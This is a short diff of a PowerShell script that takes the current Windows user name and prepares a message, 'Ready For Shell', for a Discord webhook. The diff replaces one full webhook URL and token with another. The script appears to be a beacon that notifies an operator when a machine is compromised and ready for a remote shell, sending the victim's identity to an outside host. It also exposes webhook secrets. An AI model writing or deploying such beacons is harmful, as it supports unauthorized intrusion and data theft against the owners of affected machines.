@@ -2,7 +2,7 @@
 $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 
 # Replace with your actual webhook URL
-$webhookUrl = "https://discord.com/api/webhooks/1121106143448678410/sV0LozTzh3E96PVN_6Ml2jWSwiohOoHxwa6OGUPuk2idpqC0O8CLPpsEeKJEcnRzkaql"
+$webhookUrl = "https://discord.com/api/webhooks/1145393696523681933/xc7ng4aqvvu9ywzKbw-z6FFAD3kaz_DJvIXJtAzVhHkwoBzv86XTCjrr9OozlPx-mreg"
 
 # Message content
 $message = "System Online | Ready For Shell: $currentUser"
